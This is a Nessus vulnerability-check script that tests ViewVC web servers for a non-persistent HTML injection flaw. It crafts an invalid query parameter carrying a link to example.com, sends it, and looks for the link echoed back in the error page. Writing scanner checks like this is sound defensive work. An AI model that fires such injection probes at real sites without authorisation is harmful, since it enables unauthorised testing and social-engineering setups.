#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");


if (description)
{
  script_id(42348);
  script_version("$Revision: 1.13 $");
  script_cvs_date("$Date: 2016/05/09 15:53:03 $");

  script_bugtraq_id(36035);
  script_osvdb_id(70138);

  script_name(english:"ViewVC Invalid Parameter Arbitrary HTML Injection");
  script_summary(english:"Tries a non-persistent injection attack");

  script_set_attribute( attribute:"synopsis", value:
"An application running on the remote web server has an HTML injection
vulnerability."  );
  script_set_attribute( attribute:"description", value:
"The version of ViewVC hosted on the remote host is vulnerable to a
HTML injection attack.  Requesting a URL with an invalid parameter
name in the query string generates an error message that echoes back
the parameter name.  Any URLs included in the invalid parameter name
become hyperlinks.  A remote attacker could trick a user into
requesting a malicious URL to facilitate a social engineering attempt.

According to some reports, there is also an unrelated cross-site
scripting issue in this version of ViewVC, though Nessus has not
checked for that."  );
   # http://viewvc.tigris.org/source/browse/viewvc?view=rev&revision=2219
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?846e7b9b");
   # http://viewvc.tigris.org/source/browse/viewvc/trunk/CHANGES?revision=2242&view=markup
  script_set_attribute(
    attribute:"see_also",
    value:"http://www.nessus.org/u?66b6cc34"
  );
  script_set_attribute(attribute:"solution", value:"Upgrade to ViewVC 1.0.9 or later.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_set_cvss_temporal_vector("CVSS2#E:ND/RL:OF/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_cwe_id(20, 74, 79, 442, 629, 711, 712, 722, 725, 750, 751, 800, 801, 809, 811, 864, 900, 928, 931, 990);

  script_set_attribute(attribute:"vuln_publication_date", value:"2009/07/06");
  script_set_attribute(attribute:"patch_publication_date", value:"2009/08/11");
  script_set_attribute(attribute:"plugin_publication_date", value:"2009/11/03");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:viewvc:viewvc");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses : XSS");

  script_copyright(english:"This script is Copyright (C) 2009-2016 Tenable Network Security, Inc.");

  script_dependencies("viewvc_detect.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);
  script_require_keys("www/viewvc");
  exit(0);
}


include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("webapp_func.inc");
include("url_func.inc");


port = get_http_port(default:80);
install = get_install_from_kb(appname:'viewvc', port:port);
if (isnull(install)) exit(0, "ViewVC wasn't detected on port " + port);

# Create/encode the injection attack
params = string(
  SCRIPT_NAME,
  '") was passed as a parameter. Visit http://www.example.com/ ',
  'to figure out why ("', SCRIPT_NAME, '=', unixtime()
);

# Shouldn't encode : / or =
unreserved = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_.!~*'()-]:/=";
encoded_params = urlencode(str:params, unreserved:unreserved);

expected_output = string(
  'Visit <a href="http://www.example.com/">http://www.example.com/</a> ',
  'to figure out why ("', SCRIPT_NAME, '") was passed.'
);


# Make the GET request and see if injection worked
url = string(install['dir'], '/?', encoded_params);
res = http_send_recv3(method:"GET", item:url, port:port);
if (isnull(res)) exit(1, "The web server on port "+port+" failed to respond.");

if (expected_output >< res[2])
{
  set_kb_item(name:'www/'+port+'/XSS', value:TRUE);

  if (report_verbosity > 0)
  {
    report = get_vuln_report(items:url, port:port);
    security_warning(port:port, extra:report);
  }
  else security_warning(port);

  exit(0);
}
else exit(0, "The ViewVC install at "+build_url(port:port, qs:install['dir']+"/")+" is not affected.");
